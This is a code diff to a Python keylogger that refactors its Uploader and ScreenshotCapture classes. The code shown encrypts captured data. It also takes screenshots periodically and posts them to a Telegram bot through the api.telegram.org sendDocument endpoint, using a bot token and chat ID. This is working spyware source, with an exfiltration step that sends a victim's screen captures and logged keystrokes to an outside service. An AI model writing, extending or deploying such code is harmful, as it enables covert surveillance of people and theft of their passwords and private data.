@@ -94,13 +94,15 @@ class Keylogger:
 # Send the file to Telegram at regular intervals
 class Uploader:
 
-    @staticmethod
-    def encrypt_file(filename: str) -> None:
+    def __init__(self) -> None:
+        self.encrypted_filename = join(gettempdir(), f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.enc')
+
+    def encrypt_file(self, filename: str) -> None:
         try:
             with open(filename, 'rb') as f:
                 data = f.read()
             encrypted_data = cipher_suite.encrypt(data)
-            with open(ENCRYPTED_FILENAME, 'wb') as f:
+            with open(self.encrypted_filename, 'wb') as f:
                 f.write(encrypted_data)
         except Exception as e:
             alarm(f'Encryption Error: {e}')
@@ -133,12 +135,14 @@ class Uploader:
 # Take screenshots periodically
 class ScreenshotCapture:
 
-    @staticmethod
-    def take_screenshot() -> None:
+    def __init__(self) -> None:
+        self.screenshot_filename = join(gettempdir(), 'screenshot.png')
+
+    def take_screenshot(self) -> None:
         try:
             screenshot = pyautogui.screenshot()
-            screenshot.save(SCREENSHOT_FILENAME)
-            with open(SCREENSHOT_FILENAME, 'rb') as fh:
+            screenshot.save(self.screenshot_filename)
+            with open(self.screenshot_filename, 'rb') as fh:
                 files = {'document': fh}
                 resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)
 
